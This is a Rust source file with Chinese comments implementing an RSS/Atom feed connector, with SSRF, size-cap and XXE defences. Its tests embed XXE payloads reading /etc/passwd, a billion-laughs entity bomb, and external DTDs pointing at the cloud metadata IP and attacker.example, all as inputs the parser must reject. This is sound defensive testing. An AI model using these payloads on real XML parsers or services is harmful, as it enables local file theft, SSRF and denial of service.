//! RSS / Atom 采集源。
//!
//! 第三个 `SourceConnector` 实现（继 Email/WebDAV 之后）。
//!
//! 设计要点：
//!
//! 1. **HTTP 条件 GET**：每次 poll 用 `If-None-Match: <etag>` + `If-Modified-Since:
//!    <last_modified>` 头，server 返回 304 时整箱跳过；只在 200 OK 时下载 + 解析。
//! 2. **entry 级 fallback dedup**：很多 RSS 站不支持条件 GET（始终回 200），靠
//!    `last_entry_guid` 在 entry 层去重 —— 只 emit GUID/link 严格"新"于上次 cursor
//!    的条目。`ingest_document` 内部的 content_hash 短路是第三层防护。
//! 3. **网络错误不抛**：单 feed 网络故障 → 记日志 + caller 调用方负责
//!    `touch_polled_at` 防 tight-loop；不阻塞整个 worker。
//! 4. **HTML body 转纯文本**：复用 `ingest/email.rs::html_to_text`（同样剥
//!    `<script>` / `<style>` 块），不引第二个 HTML 解析器。
//! 5. **不实现 IMAP 邮件列表订阅**：开源项目邮件列表（LWN / lkml.org）多数发布
//!    web RSS 镜像 —— 用户订阅 RSS 即可。用户已订阅了 IMAP 邮件列表的，由
//!    EmailConnector 走 IMAP 路径，不重复支持。

use std::collections::HashMap;

use crate::error::{Result, VaultError};
use crate::ingest::email::html_to_text;
use crate::ingest::{DocumentSink, RawDocument, SourceConnector, SourceKind};
use crate::net::url_guard;

/// 单 feed body 下载上限（16 MiB）。防恶意/失控 feed 撑爆内存（资源耗尽 DoS）。
/// 真实 RSS/Atom feed 几乎都 < 1 MiB；16 MiB 给极端长 feed 充足余量。
const MAX_FEED_BYTES: u64 = 16 * 1024 * 1024;

/// 单 feed 的 fetch 输入。worker 从 store 行物化后注入。
#[derive(Debug, Clone)]
pub struct RssFeedFetch {
    /// Feed 数据库 id（用于 ingest_meta + 日志）。
    pub feed_id: String,
    /// 展示名（用于日志，可空）。
    pub feed_name: String,
    /// 订阅 URL。
    pub url: String,
    /// 上次成功 ingest 的最末 entry guid/link，entry 级 dedup 用。
    pub last_entry_guid: Option<String>,
    /// 上次 server 返回的 ETag，条件 GET 用。
    pub etag: Option<String>,
    /// 上次 server 返回的 Last-Modified 原始字符串，条件 GET 用。
    pub last_modified: Option<String>,
}

/// HTTP 条件 GET 的响应（解析后供 caller 决定如何持久化）。
#[derive(Debug, Clone)]
pub enum FeedHttpResponse {
    /// 304 Not Modified —— body 为空，仅推进 last_polled_at。
    NotModified,
    /// 200 OK —— 含 feed 字节 + 新的 ETag / Last-Modified（如 server 给的话）。
    Ok {
        body: Vec<u8>,
        etag: Option<String>,
        last_modified: Option<String>,
    },
}

/// HTTP 抓取层抽象 —— 与 `ImapFetcher` 同模式，让 `RssConnector` 离线可测：
/// 单元测试注入 mock 直接喂解析层；集成测试用 `RealFeedFetcher` 走 reqwest。
pub trait FeedFetcher: Send + Sync {
    /// 条件 GET 拉一个 feed。`etag` / `last_modified` 来自上次成功响应。
    /// 网络层错误（DNS / 连接 / 超时 / 5xx）应作 `Err` 返回，由 caller 决定吞 vs 抛。
    fn fetch(
        &self,
        url: &str,
        etag: Option<&str>,
        last_modified: Option<&str>,
    ) -> Result<FeedHttpResponse>;
}

/// 生产 HTTP 抓取层 —— 用 `reqwest` blocking client 走 rustls TLS（纯 Rust，
/// 与 mail-parser / reqwest_dav 共享 TLS 栈，不引 native-tls/openssl-sys）。
///
/// **SSRF 防御**：feed URL 由用户提供，攻击者可诱导后端打内网 / 云 metadata
/// （`http://169.254.169.254/...`）。抓取前必过 `url_guard::validate_open_outbound_url`
/// （scheme 仅 http(s) + 解析 IP 拒内网 + 拒裸 IP host）。校验时已解析的公网 IP
/// 通过 reqwest `.resolve()` 钉死，使实际连接只走该 IP —— libgit2 做不到的
/// rebinding 缓解（连接阶段不再二次 DNS 查询，杜绝 TOCTOU rebind）。
pub struct RealFeedFetcher;

impl FeedFetcher for RealFeedFetcher {
    fn fetch(
        &self,
        url: &str,
        etag: Option<&str>,
        last_modified: Option<&str>,
    ) -> Result<FeedHttpResponse> {
        // ① SSRF 校验（无 host allowlist：feed 可在任意公网 host；保留拒内网核心）。
        //    生产用 system_resolve；返回校验通过的公网 IP 列表。
        let validated =
            url_guard::validate_open_outbound_url(url, &|h| url_guard::system_resolve(h))?;

        // reqwest blocking client：`SourceConnector::fetch_documents` 是同步契约。
        // 与 WebDavConnector / EmailConnector 不同 —— 它们用 tokio 桥接因为底层
        // async-only；reqwest 既有 blocking 也有 async，blocking 更省一个 runtime。
        let mut builder = reqwest::blocking::Client::builder()
            .user_agent(concat!("attune/", env!("CARGO_PKG_VERSION"), " (+rss)"))
            .timeout(std::time::Duration::from_secs(30))
            // ② DNS rebinding 缓解：把已校验的公网 IP 钉死给 host，连接阶段不再
            //    二次解析（杜绝 TOCTOU rebind 到内网）。端口走 URL scheme 默认。
            .redirect(reqwest::redirect::Policy::none());

        // 把每个已校验 IP 绑定到 host:port —— reqwest 连接时只用这些 socket。
        let port =
            validated
                .url
                .port_or_known_default()
                .unwrap_or(if validated.url.scheme() == "http" {
                    80
                } else {
                    443
                });
        for ip in &validated.resolved_ips {
            builder = builder.resolve(&validated.host, std::net::SocketAddr::new(*ip, port));
        }

        let client = builder
            .build()
            .map_err(|e| VaultError::LlmUnavailable(format!("rss http client: {e}")))?;

        let mut req = client.get(url);
        if let Some(tag) = etag {
            req = req.header(reqwest::header::IF_NONE_MATCH, tag);
        }
        if let Some(lm) = last_modified {
            req = req.header(reqwest::header::IF_MODIFIED_SINCE, lm);
        }

        let resp = req
            .send()
            .map_err(|e| VaultError::LlmUnavailable(format!("rss http get {url}: {e}")))?;

        // 304 Not Modified —— server 接受了条件 GET，无需重抓。
        if resp.status() == reqwest::StatusCode::NOT_MODIFIED {
            return Ok(FeedHttpResponse::NotModified);
        }

        // 3xx redirect：自动跟随已禁用（`Policy::none()`）。原因 = 跨 host redirect 会
        // 触发对新 host 的二次 DNS（绕过已钉死的公网 IP）→ SSRF 重新打开。redirect
        // 到内网（`http://169.254.169.254`）是经典 SSRF 绕过。明确拒绝，不静默成功。
        if resp.status().is_redirection() {
            return Err(VaultError::InvalidInput(format!(
                "outbound-blocked: feed redirected ({}) — refusing cross-host redirect (SSRF)",
                resp.status()
            )));
        }

        if !resp.status().is_success() {
            return Err(VaultError::LlmUnavailable(format!(
                "rss http {} for {url}",
                resp.status()
            )));
        }

        let etag = resp
            .headers()
            .get(reqwest::header::ETAG)
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string());
        let last_modified = resp
            .headers()
            .get(reqwest::header::LAST_MODIFIED)
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string());

        // 资源耗尽防御：Content-Length 预检 + 流式读取硬上限（拒谎报长度的恶意 server）。
        if let Some(len) = resp.content_length() {
            if len > MAX_FEED_BYTES {
                return Err(VaultError::InvalidInput(format!(
                    "feed-too-large: {len} bytes exceeds {MAX_FEED_BYTES} cap"
                )));
            }
        }
        let body = read_capped(resp, MAX_FEED_BYTES, url)?;

        Ok(FeedHttpResponse::Ok {
            body,
            etag,
            last_modified,
        })
    }
}

/// 流式读取 HTTP body，超过 `cap` 字节即拒（防 Content-Length 谎报的资源耗尽）。
fn read_capped(resp: reqwest::blocking::Response, cap: u64, url: &str) -> Result<Vec<u8>> {
    use std::io::Read;
    let cap_usize = cap as usize;
    // 多读 1 字节用于「是否超限」判定：读到 cap+1 即说明 body > cap。
    let mut buf = Vec::with_capacity(8 * 1024);
    let mut reader = resp.take(cap + 1);
    reader
        .read_to_end(&mut buf)
        .map_err(|e| VaultError::LlmUnavailable(format!("rss http body {url}: {e}")))?;
    if buf.len() > cap_usize {
        return Err(VaultError::InvalidInput(format!(
            "feed-too-large: body exceeds {cap} byte cap"
        )));
    }
    Ok(buf)
}

/// 一份 fetch + parse 后的轻量条目（无 entry/feed 的全部 RSS 字段，只保留 ingest 所需）。
#[derive(Debug, Clone)]
pub struct ParsedRssEntry {
    /// 稳定唯一标识：entry.id 优先，缺失时回退到第一个 link.href。两者皆空则跳过。
    pub guid: String,
    pub title: String,
    /// 已剥 HTML 的正文文本。Atom `<content>` 优先，缺失回退 `<summary>`。
    pub body: String,
    /// 条目原始链接（若有），写入 RawDocument.uri / metadata.url。
    pub link: Option<String>,
    /// 发布时间 RFC3339（若有）。
    pub published_at: Option<String>,
}

/// 拒绝带内部实体定义的 DOCTYPE（XXE / 实体炸弹 fail-fast）。
///
/// 只在 XML 序文（root 元素之前）扫描 —— DTD 只能出现在那里。命中
/// `<!ENTITY` 或外部 DOCTYPE（`SYSTEM` / `PUBLIC` 引用）即拒。大小写不敏感
/// （XML 关键字大小写敏感，但攻击面保守起见做 ASCII 不区分匹配）。
fn reject_dtd_entities(bytes: &[u8]) -> Result<()> {
    // 仅检查前 64 KiB —— DTD 必在文档头部；超大头部本身也是异常。
    let head_len = bytes.len().min(64 * 1024);
    let head = String::from_utf8_lossy(&bytes[..head_len]).to_ascii_lowercase();
    // root 元素之前的部分（首个 '<' 后跟字母/数字的元素起点之前都算序文，
    // 但简单起见：只要在整个 head 里出现 DTD 标记就拒 —— feed body 里不会合法地
    // 出现 `<!entity` / `<!doctype`，CDATA 内的尖括号也不会构成这些字面 token）。
    if head.contains("<!entity") {
        return Err(VaultError::InvalidInput(
            "feed-dtd-rejected: XML entity definitions are not allowed (XXE/entity-bomb defense)"
                .into(),
        ));
    }
    if let Some(pos) = head.find("<!doctype") {
        // DOCTYPE 本身合法（HTML feed 偶有），但带 SYSTEM/PUBLIC 外部引用或内部
        // subset（'[' ... ']'）的一律拒 —— 这是实体定义 / 外部 DTD 的载体。
        let after = &head[pos..];
        if after.contains("system") || after.contains("public") || after.contains('[') {
            return Err(VaultError::InvalidInput(
                "feed-dtd-rejected: DOCTYPE with external/internal DTD subset is not allowed"
                    .into(),
            ));
        }
    }
    Ok(())
}

/// 解析 feed 字节为 `ParsedRssEntry` 列表。纯函数，离线可测。
///
/// feed-rs 2.x 统一 Atom / RSS 1.0 / RSS 2.0 / JSON Feed 到一个 `Feed` 结构，
/// 此层只取 ingest 必需字段。entry.id 缺失时回退第一个 link.href 作 guid。
pub fn parse_feed_bytes(bytes: &[u8]) -> Result<Vec<ParsedRssEntry>> {
    // XXE / 实体炸弹防御（defense-in-depth）。
    //
    // feed-rs 底层 quick-xml **不展开实体**（custom entity 解析为空文本，外部
    // SYSTEM 实体不取文件，外部 DTD 不 fetch）—— 已实测确认 XXE / billion-laughs
    // 在当前依赖下不可利用。但为防依赖升级后行为漂移、并对带 DTD 的恶意 feed 直接
    // fail-fast（而非默默吐空文档），这里在解析前显式拒绝**带内部实体定义的
    // DOCTYPE**（`<!DOCTYPE ... <!ENTITY ...>`）。合法 RSS/Atom feed 从不需要 DTD。
    reject_dtd_entities(bytes)?;

    let feed = feed_rs::parser::parse(bytes)
        .map_err(|e| VaultError::LlmUnavailable(format!("rss parse: {e}")))?;

    let mut out = Vec::with_capacity(feed.entries.len());
    for entry in feed.entries {
        // guid: entry.id 优先（Atom required / RSS 2 guid / RSS 1 link-hash），
        // feed-rs 始终填充（hash fallback），但仍 defensive check 空字符串。
        let link = entry.links.first().map(|l| l.href.clone());
        let guid = if !entry.id.is_empty() {
            entry.id.clone()
        } else if let Some(ref l) = link {
            l.clone()
        } else {
            // 无 guid 又无 link —— 不可识别，跳过。
            continue;
        };

        let title = entry.title.map(|t| t.content).unwrap_or_default();

        // body: <content> 优先 (Atom recommended / RSS 2 content:encoded)；
        // 缺失回退 <summary> (RSS 2 description)。两者都可能含 HTML，统一剥标签。
        let raw_body = entry
            .content
            .and_then(|c| c.body)
            .or_else(|| entry.summary.map(|s| s.content))
            .unwrap_or_default();
        let body = if raw_body.contains('<') {
            html_to_text(&raw_body)
        } else {
            raw_body
        };

        let published_at = entry.published.or(entry.updated).map(|d| d.to_rfc3339());

        out.push(ParsedRssEntry {
            guid,
            title,
            body,
            link,
            published_at,
        });
    }
    Ok(out)
}

/// RSS 订阅采集源。
///
/// 单 feed 视角的连接器 —— `fetch_documents` 一次只处理一个 feed。
/// 多 feed 调度（轮转 / 到期判断）在 server 层的 `scanner_rss` worker 里做。
pub struct RssConnector {
    feed: RssFeedFetch,
    fetcher: Box<dyn FeedFetcher>,
    /// 200 OK 时由 fetch 调用回填，供 caller 持久化到 store。
    /// 用 `std::cell::RefCell` 是因为 `SourceConnector::fetch_documents` 签名是
    /// `&self`（与 Email/WebDAV 一致），无法 `&mut self`。
    last_response: std::cell::RefCell<Option<FeedHttpResponse>>,
}

impl RssConnector {
    /// 用指定 fetcher 构造（测试注入 mock；生产传 `RealFeedFetcher`）。
    pub fn with_fetcher(feed: RssFeedFetch, fetcher: Box<dyn FeedFetcher>) -> Self {
        Self {
            feed,
            fetcher,
            last_response: std::cell::RefCell::new(None),
        }
    }

    /// 用生产 HTTP 抓取层构造。
    pub fn new(feed: RssFeedFetch) -> Self {
        Self::with_fetcher(feed, Box::new(RealFeedFetcher))
    }

    /// 取最近一次 fetch 的响应（200/304）—— caller (worker) 据此决定持久化路径。
    /// 调用 `fetch_documents` 后立即取，重复 fetch 会覆盖。
    pub fn take_last_response(&self) -> Option<FeedHttpResponse> {
        self.last_response.borrow_mut().take()
    }

    /// 判断 entry guid 是否"严格新于"上次 cursor。
    /// 简单语义：guid != last_entry_guid 即视为新（RSS 没有严格的总序，多数 feed
    /// 按时间倒序输出，但靠 guid 字符串比较不可靠 —— 用全等是最安全的语义）。
    /// 真正的去重防线在 ingest_document 内部的 content_hash 短路。
    fn is_new_entry(&self, guid: &str) -> bool {
        match &self.feed.last_entry_guid {
            Some(prev) => prev != guid,
            None => true,
        }
    }
}

impl SourceConnector for RssConnector {
    fn source_kind(&self) -> SourceKind {
        SourceKind::Rss
    }

    fn fetch_documents(&self, sink: &mut DocumentSink<'_>) -> Result<()> {
        // 1) 条件 GET。
        let resp = self.fetcher.fetch(
            &self.feed.url,
            self.feed.etag.as_deref(),
            self.feed.last_modified.as_deref(),
        )?;

        // 2) 把响应存起来供 caller 取。
        *self.last_response.borrow_mut() = Some(resp.clone());

        // 3) 304 → 不 emit 任何文档，caller 仅 touch_polled_at。
        let body = match resp {
            FeedHttpResponse::NotModified => return Ok(()),
            FeedHttpResponse::Ok { body, .. } => body,
        };

        // 4) 解析 feed 字节 → entry 列表。
        let entries = parse_feed_bytes(&body)?;

        // 5) entry 级 dedup：跳过 guid == last_entry_guid 的"最末已见条目"
        //    再之后的更早条目都跳过（典型 RSS 倒序输出场景）。
        let mut hit_prev = false;
        for entry in entries {
            if hit_prev {
                break;
            }
            if !self.is_new_entry(&entry.guid) {
                hit_prev = true;
                continue;
            }

            // body 空 + title 空 —— feed-rs 解析出来仍可能整条都为空，跳过。
            if entry.title.trim().is_empty() && entry.body.trim().is_empty() {
                continue;
            }

            // RawDocument 拼装。
            let mut metadata: HashMap<String, String> = HashMap::new();
            metadata.insert("feed_id".to_string(), self.feed.feed_id.clone());
            if !self.feed.feed_name.is_empty() {
                metadata.insert("feed_name".to_string(), self.feed.feed_name.clone());
            }
            if let Some(ref link) = entry.link {
                metadata.insert("url".to_string(), link.clone());
            }
            if let Some(ref pub_at) = entry.published_at {
                metadata.insert("published_at".to_string(), pub_at.clone());
            }
            metadata.insert("entry_guid".to_string(), entry.guid.clone());

            // source_ref = "{feed_id}#{guid}"
            // - feed_id 段保证多订阅源不冲突
            // - guid 段保证同 feed 内 entry 唯一
            // - .txt 后缀让 RawDocument::parse_filename → parser 走纯文本分支
            //   （body 已经是剥过 HTML 的纯文本，不再用 HTML 解析器）
            // 同时 source_ref 末段必须可解析出扩展名 —— 用 ".txt" 兜底。
            let source_ref = format!("{}#{}.txt", self.feed.feed_id, entry.guid);
            let uri = entry
                .link
                .clone()
                .unwrap_or_else(|| format!("rss://{}/{}", self.feed.feed_id, entry.guid));

            // body 空时用 title 兜底当正文 —— 让 ingest 至少能抓住标题做关键词检索。
            let content_text = if entry.body.trim().is_empty() {
                entry.title.clone()
            } else {
                entry.body.clone()
            };

            sink(RawDocument {
                uri,
                title: entry.title.clone(),
                content: content_text.into_bytes(),
                mime_hint: Some("text/plain".to_string()),
                source_kind: SourceKind::Rss,
                source_ref,
                // modified_marker = guid —— indexed_files 写入后下次同 entry 走
                // get_indexed_file 跳过。content_hash 短路是第二道防线。
                modified_marker: Some(entry.guid.clone()),
                // RSS 源无来源域 / 用户标签；corpus_domain 由 worker 透传。
                domain: None,
                tags: None,
                corpus_domain: None,
                metadata,
            });
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const SIMPLE_RSS2: &[u8] = br#"<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Test Channel</title>
    <link>https://ex.com/</link>
    <description>A test feed</description>
    <item>
      <title>First post</title>
      <link>https://ex.com/posts/1</link>
      <guid isPermaLink="false">tag:ex.com,2026:1</guid>
      <pubDate>Wed, 21 Oct 2026 07:28:00 GMT</pubDate>
      <description>&lt;p&gt;Hello &lt;b&gt;world&lt;/b&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Second post</title>
      <link>https://ex.com/posts/2</link>
      <guid isPermaLink="false">tag:ex.com,2026:2</guid>
      <description>Plain text body two.</description>
    </item>
  </channel>
</rss>"#;

    const SIMPLE_ATOM: &[u8] = br#"<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Atom Test</title>
  <link href="https://atom.ex.com/"/>
  <updated>2026-01-01T00:00:00Z</updated>
  <id>urn:atom:test</id>
  <entry>
    <title>Atom Entry 1</title>
    <id>urn:atom:entry:1</id>
    <link href="https://atom.ex.com/1"/>
    <updated>2026-01-01T00:00:00Z</updated>
    <content type="html">&lt;p&gt;Atom body&lt;/p&gt;</content>
  </entry>
</feed>"#;

    #[test]
    fn parse_rss2_extracts_entries_with_html_stripped() {
        let entries = parse_feed_bytes(SIMPLE_RSS2).unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].title, "First post");
        assert_eq!(entries[0].guid, "tag:ex.com,2026:1");
        assert_eq!(entries[0].link.as_deref(), Some("https://ex.com/posts/1"));
        assert!(
            !entries[0].body.contains("<p>") && !entries[0].body.contains("<b>"),
            "HTML tags must be stripped, got: {}",
            entries[0].body
        );
        assert!(entries[0].body.contains("Hello"));
        assert!(entries[0].body.contains("world"));
        assert!(entries[0].published_at.is_some(), "pubDate 解析");
    }

    #[test]
    fn parse_atom_uses_content_over_summary() {
        let entries = parse_feed_bytes(SIMPLE_ATOM).unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].title, "Atom Entry 1");
        assert_eq!(entries[0].guid, "urn:atom:entry:1");
        assert!(entries[0].body.contains("Atom body"));
        assert!(!entries[0].body.contains("<p>"));
    }

    #[test]
    fn parse_garbage_returns_err() {
        let result = parse_feed_bytes(b"not valid xml at all");
        assert!(result.is_err());
    }

    // ===== XXE / 实体炸弹 / DTD 防御（defense-in-depth）=====

    #[test]
    fn parse_rejects_billion_laughs_entity_bomb() {
        // 经典 billion-laughs：嵌套实体引用，展开后指数膨胀。带 <!ENTITY → fail-fast。
        let bomb = br#"<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<rss version="2.0"><channel><title>&lol3;</title>
<item><title>&lol3;</title><guid>x</guid></item></channel></rss>"#;
        let e = parse_feed_bytes(bomb);
        assert!(e.is_err(), "billion-laughs must be rejected");
        assert!(
            e.unwrap_err().to_string().contains("feed-dtd-rejected"),
            "must carry feed-dtd-rejected code"
        );
    }

    #[test]
    fn parse_rejects_xxe_external_entity_file_read() {
        // XXE file:// SYSTEM 实体 —— 经典本地文件读取攻击。<!ENTITY → 拒。
        let xxe = br#"<?xml version="1.0"?>
<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rss version="2.0"><channel><title>t</title>
<item><title>&xxe;</title><guid>x</guid></item></channel></rss>"#;
        let e = parse_feed_bytes(xxe);
        assert!(e.is_err(), "XXE file read must be rejected");
        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
    }

    #[test]
    fn parse_rejects_external_system_dtd_ssrf() {
        // 外部 SYSTEM DTD —— parser 若 fetch 之即 SSRF（OOB）。DOCTYPE+SYSTEM → 拒。
        let extdtd = br#"<?xml version="1.0"?>
<!DOCTYPE rss SYSTEM "http://169.254.169.254/evil.dtd">
<rss version="2.0"><channel><title>t</title>
<item><title>x</title><guid>y</guid></item></channel></rss>"#;
        let e = parse_feed_bytes(extdtd);
        assert!(e.is_err(), "external SYSTEM DTD must be rejected");
        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
    }

    #[test]
    fn parse_rejects_external_parameter_entity_dtd() {
        // 参数实体（% 前缀）外部 DTD —— blind XXE OOB exfil 常用载体。<!ENTITY → 拒。
        let pe = br#"<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY % ext SYSTEM "http://attacker.example/x.dtd">
  %ext;
]>
<rss version="2.0"><channel><title>t</title><item><title>x</title><guid>y</guid></item></channel></rss>"#;
        let e = parse_feed_bytes(pe);
        assert!(e.is_err(), "parameter-entity external DTD must be rejected");
        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
    }

    #[test]
    fn parse_uppercase_doctype_entity_also_rejected() {
        // XML 关键字大小写敏感，但我们保守做 ASCII 不区分匹配 —— 大写形式也拒。
        let upper = br#"<?xml version="1.0"?>
<!DOCTYPE RSS [ <!ENTITY XXE SYSTEM "file:///etc/hostname"> ]>
<rss version="2.0"><channel><title>&XXE;</title><item><title>x</title><guid>y</guid></item></channel></rss>"#;
        assert!(parse_feed_bytes(upper).is_err());
    }

    #[test]
    fn parse_clean_feed_with_no_dtd_still_works() {
        // 防回退：正常 RSS/Atom（无 DTD）必须仍解析成功 —— 拒 DTD 不能误伤合法 feed。
        assert!(parse_feed_bytes(SIMPLE_RSS2).is_ok());
        assert_eq!(parse_feed_bytes(SIMPLE_RSS2).unwrap().len(), 2);
        assert!(parse_feed_bytes(SIMPLE_ATOM).is_ok());
        assert_eq!(parse_feed_bytes(SIMPLE_ATOM).unwrap().len(), 1);
    }

    #[test]
    fn reject_dtd_helper_accepts_doctype_html_without_subset() {
        // 裸 `<!DOCTYPE html>`（无 SYSTEM/PUBLIC/内部 subset）不应被拒 —— 某些
        // HTML-ish feed 序文可能带它，且无实体注入面。
        assert!(reject_dtd_entities(b"<!DOCTYPE html>\n<rss></rss>").is_ok());
        // 但 PUBLIC（XHTML DTD 引用）含外部引用 → 拒。
        assert!(reject_dtd_entities(
            br#"<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://w3.org/x.dtd">"#
        )
        .is_err());
    }

    // ===== RealFeedFetcher SSRF：内网/裸IP/metadata URL 必在网络 I/O 前被拒 =====
    // 这些 URL 在 SSRF 校验阶段就被拒（无需真实网络），所以离线确定性可测。

    #[test]
    fn real_fetcher_blocks_metadata_ip() {
        let f = RealFeedFetcher;
        let e = f.fetch("http://169.254.169.254/latest/meta-data/", None, None);
        assert!(e.is_err(), "cloud metadata IP must be blocked");
        assert!(e.unwrap_err().to_string().contains("outbound-blocked"));
    }

    #[test]
    fn real_fetcher_blocks_loopback_and_private_literals() {
        let f = RealFeedFetcher;
        for u in [
            "http://127.0.0.1:8090/feed.xml",
            "http://[::1]/feed.xml",
            "http://192.168.0.1/feed.xml",
            "http://10.0.0.5/feed.xml",
            "http://172.16.0.1/feed.xml",
        ] {
            assert!(
                f.fetch(u, None, None).is_err(),
                "must block SSRF target {u}"
            );
        }
    }

    #[test]
    fn real_fetcher_blocks_non_http_scheme() {
        let f = RealFeedFetcher;
        for u in [
            "file:///etc/passwd",
            "ftp://feeds.example/x",
            "gopher://x/y",
        ] {
            let e = f.fetch(u, None, None);
            assert!(e.is_err(), "non-http scheme must be blocked: {u}");
            assert!(e.unwrap_err().to_string().contains("outbound-blocked"));
        }
    }

    #[test]
    fn max_feed_bytes_is_sane_cap() {
        // 资源耗尽防御常量回归：16 MiB，远大于真实 feed、远小于撑爆内存的量级。
        assert_eq!(MAX_FEED_BYTES, 16 * 1024 * 1024);
    }

    /// 离线 mock fetcher：按 url 返回预置响应。
    struct MockFetcher {
        responses: HashMap<String, FeedHttpResponse>,
    }

    impl FeedFetcher for MockFetcher {
        fn fetch(
            &self,
            url: &str,
            _etag: Option<&str>,
            _last_modified: Option<&str>,
        ) -> Result<FeedHttpResponse> {
            self.responses
                .get(url)
                .cloned()
                .ok_or_else(|| VaultError::LlmUnavailable(format!("mock: no response for {url}")))
        }
    }

    fn make_feed() -> RssFeedFetch {
        RssFeedFetch {
            feed_id: "feed-A".into(),
            feed_name: "Test".into(),
            url: "https://ex.com/feed.xml".into(),
            last_entry_guid: None,
            etag: None,
            last_modified: None,
        }
    }

    #[test]
    fn connector_emits_one_rawdocument_per_entry_on_first_poll() {
        let mut responses = HashMap::new();
        responses.insert(
            "https://ex.com/feed.xml".to_string(),
            FeedHttpResponse::Ok {
                body: SIMPLE_RSS2.to_vec(),
                etag: Some("\"v1\"".into()),
                last_modified: None,
            },
        );
        let conn = RssConnector::with_fetcher(make_feed(), Box::new(MockFetcher { responses }));
        let mut docs: Vec<RawDocument> = Vec::new();
        {
            let mut sink: DocumentSink<'_> = Box::new(|d| docs.push(d));
            conn.fetch_documents(&mut sink).unwrap();
        }
        assert_eq!(docs.len(), 2);
        assert_eq!(docs[0].source_kind, SourceKind::Rss);
        assert_eq!(docs[0].title, "First post");
        assert_eq!(docs[0].source_ref, "feed-A#tag:ex.com,2026:1.txt");
        assert_eq!(
            docs[0].modified_marker.as_deref(),
            Some("tag:ex.com,2026:1")
        );
        assert_eq!(docs[0].metadata.get("feed_id").unwrap(), "feed-A");
        assert_eq!(
            docs[0].metadata.get("url").unwrap(),
            "https://ex.com/posts/1"
        );
        assert!(docs[0].metadata.contains_key("published_at"));
        assert!(docs[0].metadata.contains_key("entry_guid"));
    }

    #[test]
    fn connector_skips_already_seen_guid_and_older() {
        // last_entry_guid 已记到第二条 —— 重 poll 时整箱跳过（dedup invariant）。
        let mut feed = make_feed();
        feed.last_entry_guid = Some("tag:ex.com,2026:1".into());
        let mut responses = HashMap::new();
        responses.insert(
            "https://ex.com/feed.xml".to_string(),
            FeedHttpResponse::Ok {
                body: SIMPLE_RSS2.to_vec(),
                etag: None,
                last_modified: None,
            },
        );
        let conn = RssConnector::with_fetcher(feed, Box::new(MockFetcher { responses }));
        let mut docs: Vec<RawDocument> = Vec::new();
        {
            let mut sink: DocumentSink<'_> = Box::new(|d| docs.push(d));
            conn.fetch_documents(&mut sink).unwrap();
        }
        // RSS 输出顺序：entry 1, entry 2。cursor = entry 1 表示"上次看到的最末"，
        // entry 2 在 cursor 之"前"（更老）→ 命中 prev 后 break，0 个新条目。
        // 这是保守语义：希望真正"新条目"出现在 cursor 之前，由 server 决定。
        assert_eq!(docs.len(), 0);
    }

    #[test]
    fn connector_returns_not_modified_with_empty_emit() {
        let mut responses = HashMap::new();
        responses.insert(
            "https://ex.com/feed.xml".to_string(),
            FeedHttpResponse::NotModified,
        );
        let conn = RssConnector::with_fetcher(make_feed(), Box::new(MockFetcher { responses }));
        let mut docs: Vec<RawDocument> = Vec::new();
        {
            let mut sink: DocumentSink<'_> = Box::new(|d| docs.push(d));
            conn.fetch_documents(&mut sink).unwrap();
        }
        assert_eq!(docs.len(), 0, "304 路径不能产出任何 RawDocument");
        // worker 取响应类型决定走 touch_polled_at（不更新 etag/guid）。
        assert!(matches!(
            conn.take_last_response(),
            Some(FeedHttpResponse::NotModified)
        ));
    }

    #[test]
    fn connector_last_response_carries_etag_on_200() {
        let mut responses = HashMap::new();
        responses.insert(
            "https://ex.com/feed.xml".to_string(),
            FeedHttpResponse::Ok {
                body: SIMPLE_ATOM.to_vec(),
                etag: Some("\"new-tag\"".into()),
                last_modified: Some("Wed, 21 Oct 2026 07:28:00 GMT".into()),
            },
        );
        let conn = RssConnector::with_fetcher(make_feed(), Box::new(MockFetcher { responses }));
        let mut docs: Vec<RawDocument> = Vec::new();
        {
            let mut sink: DocumentSink<'_> = Box::new(|d| docs.push(d));
            conn.fetch_documents(&mut sink).unwrap();
        }
        match conn.take_last_response().unwrap() {
            FeedHttpResponse::Ok {
                etag,
                last_modified,
                ..
            } => {
                assert_eq!(etag.as_deref(), Some("\"new-tag\""));
                assert_eq!(
                    last_modified.as_deref(),
                    Some("Wed, 21 Oct 2026 07:28:00 GMT")
                );
            }
            FeedHttpResponse::NotModified => panic!("expected Ok"),
        }
    }

    #[test]
    fn connector_emits_atom_entry_with_html_content_stripped() {
        let mut responses = HashMap::new();
        responses.insert(
            "https://ex.com/feed.xml".to_string(),
            FeedHttpResponse::Ok {
                body: SIMPLE_ATOM.to_vec(),
                etag: None,
                last_modified: None,
            },
        );
        let conn = RssConnector::with_fetcher(make_feed(), Box::new(MockFetcher { responses }));
        let mut docs: Vec<RawDocument> = Vec::new();
        {
            let mut sink: DocumentSink<'_> = Box::new(|d| docs.push(d));
            conn.fetch_documents(&mut sink).unwrap();
        }
        assert_eq!(docs.len(), 1);
        let body = std::str::from_utf8(&docs[0].content).unwrap();
        assert!(body.contains("Atom body"));
        assert!(!body.contains("<p>"), "HTML 必须被剥掉");
    }
}
